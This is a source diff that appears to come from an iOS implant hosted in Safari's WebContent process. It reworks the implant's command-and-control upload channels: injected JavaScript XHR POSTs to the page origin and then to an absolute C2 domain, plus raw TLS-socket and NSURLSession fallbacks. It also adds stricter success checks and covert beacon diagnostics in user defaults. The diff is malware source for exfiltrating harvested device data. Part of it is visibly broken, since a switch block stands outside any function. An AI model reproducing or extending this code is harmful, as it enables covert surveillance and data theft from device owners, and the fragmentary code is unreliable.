@@ -7,7 +7,8 @@
  *     Resolves the live page JSContext via +[JSContext currentContext] and,
  *     when that is nil (common after Stage .Pt() native edges), via
  *     JSGlobalContextGetCurrent → +[JSContext contextWithJSGlobalContextRef:].
- *     POST uses sync XMLHttpRequest with a same-origin relative URL (C2_UPLOAD).
+ *     POST uses sync XMLHttpRequest, trying URLs in order: location.origin+path,
+ *     same-host relative path, then absolute URL from c2.h (proxy/C2 drift).
  *
  *   Channel B — raw POSIX socket + SecureTransport TLS  [PRIMARY outside WC]
  *     Works outside WebContent (e.g. after persistence into syslogd).
@@ -40,8 +41,11 @@
 #include <netdb.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <unistd.h>
 #include <sys/utsname.h>
 #include <sys/sysctl.h>
+#include <inttypes.h>
+#include <stdio.h>
 
 #pragma clang diagnostic push
 #pragma clang diagnostic ignored "-Wdeprecated-declarations"
@@ -142,10 +146,13 @@ static JSGlobalContextRef coruna_jsc_global_context_get_current(void) {
     return fn ? fn() : NULL;
 }
 
-/** Prefer +currentContext; if nil, wrap VM TLS JSGlobalContextRef (WebKit page). */
+/* Prefer +currentContext; if nil, wrap VM TLS JSGlobalContextRef (WebKit page).
+ *
+ * Evaluate injected XHR on the raw JSGlobalContextRef via JSEvaluateScript (C API)
+ * where possible: the ObjC JSContext wrapper can expose a different global than
+ * the page window in some WebKit builds (XMLHttpRequest missing).
+ */
 static id coruna_resolve_web_jscontext(bool *used_vm_tls) {
-    if (used_vm_tls)
-        *used_vm_tls = false;
 
     Class cls = NSClassFromString(@"JSContext");
     if (!cls)
@@ -172,90 +179,193 @@ static id coruna_resolve_web_jscontext(bool *used_vm_tls) {
     return c;
 }
 
+/* Last beacon Channel-C result for field debug (Safari WebContent NSUserDefaults). */
+#ifndef CRU_C2_DEFAULTS_DIAG_KEY
+#define CRU_C2_DEFAULTS_DIAG_KEY @"__cru_c2beacon"
+#endif
+
 /*
- * Same-origin POST (relative URL) — scheme/host/port always match the document
- * that loaded payloads/bootstrap.dylib; avoids mismatches with macros vs proxy.
+ * Persist compact Channel-C outcome (no payload).  WebContent standardUserDefaults
+ * is per-process; key may appear in MobileSafari WebContent preferences plist on
+ * rooted/imaged devices — not in Settings → Analytics export.
+ */
+static void coruna_c2_store_diag(int32_t status, bool had_ctx, bool vm_tls) {
+    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
+    NSString *s = [NSString stringWithFormat:@"v%s st=%" PRId32 " ctx=%d tls=%d t=%.0f",
+                   PAYLOAD_VERSION, status, had_ctx ? 1 : 0, vm_tls ? 1 : 0,
+                   [[NSDate date] timeIntervalSince1970]];
+    [d setObject:s forKey:CRU_C2_DEFAULTS_DIAG_KEY];
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wdeprecated-declarations"
+    [d synchronize];
+#pragma clang diagnostic pop
+}
+
+/*
+ * Build sync XHR script: try location.origin+C2_UPLOAD, relative C2_UPLOAD, absolute
+ * https?://C2_DOMAIN+C2_UPLOAD.  Returns last HTTP status, or -1 (no XHR), -2 (outer
+ * exc), -3 (per-URL inner exc), -100 (eval nil), -101 (no toInt32).
  */
 static NSString *jsc_xhr_script(NSData *body, NSString *uuid) {
     NSString *b64body = [body base64EncodedStringWithOptions:0];
+    NSString *abs   = [NSString stringWithFormat:@"%@://%s%s",
+                       C2_USE_HTTPS ? @"https" : @"http", C2_DOMAIN, C2_UPLOAD];
     return [NSString stringWithFormat:
         @"(function(){"
         @"try{"
         @"var g=(typeof window!=='undefined'?window:self);"
         @"var X=g.XMLHttpRequest;if(!X)return-1;"
-        @"var _xhr=new X();"
-        @"_xhr.open('POST','%s',false);"
-        @"_xhr.setRequestHeader('Content-Type','application/json');"
-        @"_xhr.setRequestHeader('X-Device-UUID','%@');"
-        @"_xhr.send(atob('%@'));"
-        @"return _xhr.status|0;"
+        @"var urls=[];"
+        @"try{if(typeof location!=='undefined'&&location.origin)urls.push(location.origin+'%s');}catch(e){}"
+        @"urls.push('%s');"
+        @"urls.push('%@');"
+        @"var uuid='%@',raw=atob('%@');"
+        @"var last=0;"
+        @"for(var i=0;i<urls.length;i++){"
+        @"var x=new X();"
+        @"try{"
+        @"x.open('POST',urls[i],false);"
+        @"x.setRequestHeader('Content-Type','application/json');"
+        @"x.setRequestHeader('X-Device-UUID',uuid);"
+        @"x.send(raw);"
+        @"last=x.status|0;"
+        @"if(last>=200&&last<300)return last;"
+        @"}catch(e){last=-3;}"
+        @"}"
+        @"return last;"
         @"}catch(e){return-2;}"
         @"})();",
-        C2_UPLOAD, uuid, b64body];
+        C2_UPLOAD, C2_UPLOAD, abs, uuid, b64body];
 }
 
-static bool jsc_eval_http_upload_ok(id ctx, NSString *script) {
+/* ObjC JSContext path (fallback when C API is inconclusive). */
+static int32_t jsc_eval_xhr_status_objc(id ctx, NSString *script) {
     SEL evalSel = NSSelectorFromString(@"evaluateScript:");
     if (!ctx || !script || ![ctx respondsToSelector:evalSel])
-        return false;
+        return -100;
 
     id (*msgId)(id, SEL, id) = (id (*)(id, SEL, id))objc_msgSend;
     id jsv = msgId(ctx, evalSel, script);
     if (!jsv) {
         os_log(coruna_c2_log(), "channel C: evaluateScript returned nil");
-        return false;
+        return -100;
     }
 
     SEL toIntSel = NSSelectorFromString(@"toInt32");
     if (![jsv respondsToSelector:toIntSel]) {
         os_log(coruna_c2_log(), "channel C: JSValue lacks toInt32");
-        return false;
+        return -101;
     }
 
-    int32_t st = ((int32_t (*)(id, SEL))objc_msgSend)(jsv, toIntSel);
-    if (st == -1) {
-        os_log(coruna_c2_log(), "channel C: XMLHttpRequest missing (wrong global object)");
-        return false;
-    }
-    if (st == -2) {
-        os_log(coruna_c2_log(), "channel C: JS exception during XHR");
-        return false;
-    }
-    if (st < 0) {
-        os_log(coruna_c2_log(), "channel C: unexpected code %{public}d", st);
-        return false;
-    }
+    return ((int32_t (*)(id, SEL))objc_msgSend)(jsv, toIntSel);
+}
 
-    if (st < 200 || st >= 300) {
-        os_log(coruna_c2_log(), "channel C: HTTP %{public}d (want 2xx)", st);
-        return false;
+static int32_t jsc_eval_xhr_status_capi(JSGlobalContextRef gctx, NSString *script) {
+    if (!gctx || script.length == 0)
+        return -100;
+    JSStringRef jss = JSStringCreateWithCFString((__bridge CFStringRef)script);
+    if (!jss)
+        return -100;
+    JSValueRef exc = NULL;
+    JSValueRef res = JSEvaluateScript(gctx, jss, NULL, NULL, 0, &exc);
+    JSStringRelease(jss);
+    if (exc) {
+        os_log(coruna_c2_log(), "channel C: C-API script exception");
+        return -102;
     }
-    return true;
+    if (!res)
+        return -100;
+    if (JSValueIsUndefined(gctx, res) || JSValueIsNull(gctx, res))
+        return -103;
+    if (JSValueIsBoolean(gctx, res))
+        return JSValueToBoolean(gctx, res) ? 200 : 0;
+    if (!JSValueIsNumber(gctx, res))
+        return -103;
+    double d = JSValueToNumber(gctx, res, &exc);
+    if (exc)
+        return -102;
+    return (int32_t)d;
+}
+
+/** Prefer JSEvaluateScript on TLS JSGlobalContextRef; ObjC wrapper is fallback. */
+static int32_t jsc_eval_xhr_status_best(id objcCtx, NSString *script) {
+    JSGlobalContextRef gref = coruna_jsc_global_context_get_current();
+    if (gref) {
+        int32_t st = jsc_eval_xhr_status_capi(gref, script);
+        if (st != -102 && st != -103)
+            return st;
+    }
+    if (objcCtx)
+        return jsc_eval_xhr_status_objc(objcCtx, script);
+    return gref ? -102 : -100;
+}
+    switch (st) {
+    case -1:
+        os_log(coruna_c2_log(), "channel C: XMLHttpRequest missing");
+        break;
+    case -2:
+        os_log(coruna_c2_log(), "channel C: JS exception (outer)");
+        break;
+    case -3:
+        os_log(coruna_c2_log(), "channel C: JS exception (per-URL)");
+        break;
+    case -102:
+        os_log(coruna_c2_log(), "channel C: C-API eval exception");
+        break;
+    case -103:
+        os_log(coruna_c2_log(), "channel C: unexpected script return type");
+        break;
+    case -100:
+    case -101:
+        break;
+    default:
+        if (st < 200 || st >= 300)
+            os_log(coruna_c2_log(), "channel C: HTTP %{public}d (want 2xx)", st);
+        break;
+    }
 }
 
 /*
  * upload_via_jsc_now — call while still on the WebKit / JSC thread that ran .Pt().
+ *
+ * Retries context resolution briefly: TLS slot can lag one tick behind .Pt().
  */
 static bool upload_via_jsc_now(NSData *body, NSString *uuid) {
     SEL evalSel = NSSelectorFromString(@"evaluateScript:");
+    id ctx = nil;
     bool via_tls = false;
-    id ctx = coruna_resolve_web_jscontext(&via_tls);
-    if (!ctx || ![ctx respondsToSelector:evalSel]) {
+
+    for (int attempt = 0; attempt < 4 && !ctx; attempt++) {
+        if (attempt)
+            usleep(300);
+        ctx = coruna_resolve_web_jscontext(&via_tls);
+    }
+
+    JSGlobalContextRef gref = coruna_jsc_global_context_get_current();
+    if ((!ctx || ![ctx respondsToSelector:evalSel]) && !gref) {
         os_log(coruna_c2_log(), "channel C: no JSContext (vmTLS=%{public}d)", via_tls ? 1 : 0);
+        coruna_c2_store_diag(-200, false, via_tls);
         return false;
     }
 
-    if (!g_saved_jsc)
+    if (ctx && !g_saved_jsc)
         g_saved_jsc = ctx;
 
     NSString *script = jsc_xhr_script(body, uuid);
     @try {
-        bool ok = jsc_eval_http_upload_ok(ctx, script);
-        if (ok)
-            os_log(coruna_c2_log(), "channel C: upload ok (vmTLS=%{public}d)", via_tls ? 1 : 0);
+        int32_t st = jsc_eval_xhr_status_best(ctx, script);
+        coruna_c2_store_diag(st, (ctx != nil || gref != NULL), via_tls);
+        bool ok = (st >= 200 && st < 300);
+        if (ok) {
+            os_log(coruna_c2_log(), "channel C: upload ok st=%{public}d (vmTLS=%{public}d)",
+                   st, via_tls ? 1 : 0);
+        } else {
+            jsc_log_xhr_status(st);
+        }
         return ok;
     } @catch (...) {
         os_log(coruna_c2_log(), "channel C: ObjC exception in eval");
+        coruna_c2_store_diag(-199, true, via_tls);
         return false;
     }
 }
@@ -305,9 +415,16 @@ static bool upload_via_jsc_dispatch(NSData *body, NSString *uuid) {
 
     NSString *script = jsc_xhr_script(body, uuid);
     @try {
-        return jsc_eval_http_upload_ok(ctx, script);
+        int32_t st = jsc_eval_xhr_status_best(ctx, script);
+        /* harvest thread: vm_tls flag not tracked here */
+        coruna_c2_store_diag(st, true, false);
+        bool ok = (st >= 200 && st < 300);
+        if (!ok)
+            jsc_log_xhr_status(st);
+        return ok;
     } @catch (...) {
         os_log(coruna_c2_log(), "channel C: background eval exception");
+        coruna_c2_store_diag(-199, true, false);
         return false;
     }
 }
@@ -342,7 +459,7 @@ static OSStatus ssl_write_fn(SSLConnectionRef ref, const void *data, size_t *len
 /*
  * raw_https_post — blocking HTTPS POST over a raw TCP + TLS socket.
  *
- * Returns true when the server returns at least a partial HTTP response.
+ * Returns true when the server returns HTTP 2xx in the first response line.
  *
  * Key properties:
  *  • connect() uses O_NONBLOCK + select() with a 10-second timeout so we
@@ -431,14 +548,22 @@ static bool raw_https_post(const char *host, int port, const char *path,
             "Connection: close\r\n\r\n",
             path, host, body_len, uuid_str ? uuid_str : "");
 
-        size_t wrote = 0;
-        if (SSLWrite(ctx, hdr, (size_t)hdr_len, &wrote) == noErr &&
-            SSLWrite(ctx, body, body_len, &wrote) == noErr) {
-            /* Drain the first chunk of the HTTP response */
+        size_t hw = 0, bw = 0;
+        if (SSLWrite(ctx, hdr, (size_t)hdr_len, &hw) == noErr && hw == (size_t)hdr_len &&
+            SSLWrite(ctx, body, body_len, &bw) == noErr && bw == body_len) {
+            /* Drain the first chunk of the HTTP response; require 2xx status line. */
             uint8_t buf[512];
             size_t nread = 0;
             OSStatus rs = SSLRead(ctx, buf, sizeof(buf), &nread);
-            ok = (rs == noErr || rs == errSSLClosedGraceful) && nread > 0;
+            if ((rs == noErr || rs == errSSLClosedGraceful) && nread > 0) {
+                char line[sizeof(buf) + 1];
+                size_t cpy = nread < sizeof(line) - 1 ? nread : sizeof(line) - 1;
+                memcpy(line, buf, cpy);
+                line[cpy] = '\0';
+                int code = 0;
+                if (sscanf(line, "HTTP/%*[^ ] %d", &code) == 1)
+                    ok = (code >= 200 && code < 300);
+            }
         }
     }
 
@@ -473,7 +598,10 @@ static bool nsurlsession_post(NSURL *url, NSData *body, NSString *uuid) {
     NSURLSession *session = [NSURLSession sessionWithConfiguration:cfg];
     [[session dataTaskWithRequest:req
                 completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
-        succeeded = (e == nil && r != nil);
+        NSInteger code = 0;
+        if ([r isKindOfClass:[NSHTTPURLResponse class]])
+            code = [(NSHTTPURLResponse *)r statusCode];
+        succeeded = (e == nil && code >= 200 && code < 300);
         dispatch_semaphore_signal(sem);
     }] resume];
 
